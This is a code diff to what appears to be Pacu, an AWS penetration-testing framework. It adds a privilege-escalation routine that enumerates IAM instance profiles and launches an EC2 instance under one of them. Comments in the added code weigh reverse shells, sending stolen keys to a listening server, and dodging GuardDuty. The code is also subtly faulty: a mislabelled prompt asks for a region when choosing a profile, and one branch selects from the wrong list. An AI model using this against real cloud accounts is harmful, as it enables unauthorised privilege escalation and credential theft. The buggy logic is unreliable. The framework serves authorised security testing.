@@ -788,9 +788,49 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
     ami = amis_by_region[region]
 
     print('    Targeting region {}...'.format(region))
+    
+    client = pacu_main.get_boto3_client('iam')
 
+    response = client.list_instance_profiles()
+    instance_profiles = response['InstanceProfiles']
+    while 'IsTruncated' in response and response['IsTruncated'] is True:
+        response = client.list_instance_profiles(
+            Marker=response['Marker']
+        )
+        instance_profiles.extend(response['InstanceProfiles'])
 
+    instance_profiles_with_roles = []
+    for ip in instance_profiles:
+        if len(ip['Roles']) > 0:
+            instance_profiles_with_roles.append(ip)
 
+    if len(instance_profiles_with_roles) > 1:
+        print('  Found multiple instance profiles. Choose one below. Only instance profiles with roles attached are shown.\n')
+        for i in range(0, len(instance_profiles_with_roles)):
+            print('  [{}] {}'.format(i, instance_profiles_with_roles[i]['InstanceProfileName']))
+        choice = input('What region do you want to launch the EC2 instance in? ')
+        instance_profile = instance_profiles_with_roles[int(choice)]
+    elif len(instance_profiles_with_roles) == 1:
+        instance_profile = instance_profiles[0]
+    else:
+        print('    No instance profiles with roles attached were found in region {}. Skipping to the next privilege escalation method...\n'.format(region))
+        return False
+
+    # Need to figure out how to get credentials out of the instance or access to the instance with as few privs as possible
+    # Could reverse shell on startup, but would require user to have a server listening+outbound internet (no guardduty trigger if could make aws calls from the reverse shell)
+    # Could run an AWS command on startup, but would require outbound internet (No guardduty trigger)
+    # Could post the keys to a web server, but would require user to have a server listening+outbound internet (would trigger guardduty after using the keys outside the instance)
+    client = pacu_main.get_boto3_client('ec2', region)
+    client.run_instances(
+        ImageId=ami,
+        MaxCount=1,
+        MinCount=1,
+        InstanceType='t2.micro',
+        IamInstanceProfile={
+            'Arn': instance_profile['Arn'],
+            'Name': instance_profile['InstanceProfileName']
+        }
+    )
 
 
 
